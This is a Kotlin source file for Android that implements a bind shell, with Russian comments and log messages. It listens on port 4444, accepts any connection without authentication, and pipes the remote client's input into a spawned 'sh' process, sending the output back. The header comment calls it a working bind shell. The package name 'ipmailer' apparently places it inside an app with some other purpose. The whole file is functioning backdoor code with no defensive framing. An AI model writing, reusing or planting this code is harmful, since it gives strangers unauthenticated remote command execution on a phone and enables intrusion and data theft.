// BindShell.kt — РАБОЧИЙ bind-shell (телефон слушает порт)
package com.example.ipmailer

import android.util.Log
import java.net.ServerSocket
import java.net.Socket
import kotlin.concurrent.thread

object BindShell {
    private const val TAG = "BindShell"
    private const val PORT = 4444

    @Volatile
    private var isRunning = false

    fun start() {
        if (isRunning) return
        isRunning = true
        Log.e(TAG, "BindShell запущен — слушаем порт $PORT")

        thread(name = "BindShell-Server", isDaemon = false) {
            var serverSocket: ServerSocket? = null
            try {
                serverSocket = ServerSocket(PORT).apply {
                    reuseAddress = true
                }
                Log.e(TAG, "УСПЕШНО! Порт $PORT открыт — ждём подключений")

                while (isRunning) {
                    try {
                        val client = serverSocket.accept()
                        Log.e(TAG, "Подключение от ${client.inetAddress.hostAddress}:${client.port}")
                        handleClient(client)
                    } catch (e: Exception) {
                        if (isRunning) Log.w(TAG, "accept() ошибка", e)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Не удалось открыть порт $PORT", e)
            } finally {
                serverSocket?.close()
            }
        }
    }

    private fun handleClient(socket: Socket) {
        thread {
            try {
                val process = Runtime.getRuntime().exec("sh")
                val input = socket.getInputStream()
                val output = socket.getOutputStream()
                val shellOut = process.inputStream
                val shellErr = process.errorStream
                val shellIn = process.outputStream

                // Читаем команды от тебя → в sh
                thread {
                    val buffer = ByteArray(1024)
                    var len: Int
                    try {
                        while (input.read(buffer).also { len = it } != -1) {
                            shellIn.write(buffer, 0, len)
                            shellIn.flush()
                        }
                    } catch (e: Exception) { /* разрыв */ }
                }

                // Вывод sh → тебе
                thread {
                    val buffer = ByteArray(8192)
                    var len: Int
                    while (shellOut.read(buffer).also { len = it } != -1) {
                        output.write(buffer, 0, len)
                        output.flush()
                    }
                }

                // Ошибки sh → тебе
                thread {
                    val buffer = ByteArray(8192)
                    var len: Int
                    while (shellErr.read(buffer).also { len = it } != -1) {
                        output.write(buffer, 0, len)
                        output.flush()
                    }
                }

                process.waitFor()
            } catch (e: Exception) {
                Log.w(TAG, "Клиент отключился", e)
            } finally {
                socket.close()
            }
        }
    }

    fun stop() {
        isRunning = false
    }
}